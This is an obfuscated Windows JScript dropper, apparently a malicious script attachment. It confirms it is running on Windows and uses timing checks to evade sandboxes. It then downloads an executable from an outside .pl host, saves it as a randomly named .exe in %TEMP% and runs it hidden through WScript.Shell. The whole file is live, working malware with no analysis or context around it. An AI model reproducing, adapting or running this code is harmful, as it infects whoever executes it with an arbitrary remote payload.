var Z0 = false;
var XN = "Create"+"Object";
var H = function I() {return WScript[XN]("WScript"+".Shell");}(), O = 11;
var KT = "MSXML2"+".XMLHTTP";
var YI = 2;
var FS = YI - 2;
function FK(G){H["Run"](G, FS, FS);};
function R(){return KT + "";};
function LB(DM, T0){FS = FS * 1; return DM - T0;};
function TP(){return XN;};
/*@cc_on
  @if (@_win32 || @_win64)
    Z0 = true;
  @end
@*/
if (Z0)
{
var YG = "";
function MC(){return 22;};
var FE = 0; var AD = 0;
function TN()
{
var L = new this["Date"]();
var FW = L["getUTCMilliseconds"]();
WScript["Sleep"](MC());
var L = new this["Date"]();
var DO = L["getUTCMilliseconds"]();
WScript["Sleep"](MC());
var L = new this["Date"]();
var XD = L["getUTCMilliseconds"]();
var FE = "J";
FE = LB(DO, FW);
var AD = "Z";
AD = LB(XD, DO);
YG = "open";
return LB(FE, AD);
}
var ZN = false;
var U = false;
for (var R0 = FS; R0 < MC() * 1; R0++){if (TN() != FS){
ZN = true; 
AD = "31" + 11 * FE + AD; 
U = true; 
break;
}}
function AJ() {return ((ZN == true) && (ZN == U)) ? 1 : FS;};
if (ZN && AJ() && U){
function UM() {return H["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "tAhu2bunNKJU2.ex" + "e";};
 ML = R();
 R1 = WScript[XN](ML);
 var T = 1;
do { 
	for (;T;){
	try {
		if (T == 1)
		{
			R1[YG]("GET", "http://xn--po-wqa.pl/a8zkde", false);
			R1["send"]();
			W = "Sleep";
			T = 2;
		}
		WScript[W](MC() + 120); 
		if (R1["readystate"] < 2 * 2) continue;
		T = FS;
		function S(F) {var DI = (1, 2, 3, 4, 5, F); return DI;};
		H0 = WScript[TP()]("ADODB.Stream");
		ML = H0;
		ML[YG]();
		ML["type"] = S(1);
		ML["write"](R1["ResponseBody"]);
		H0["position"] = S(FS);
		ML["Save" + "ToFile"](UM(), 2);
		H0["cl"+"ose"]();
		A = UM();
		FK(A);
	} catch(P){};};
}while (T);
}
}

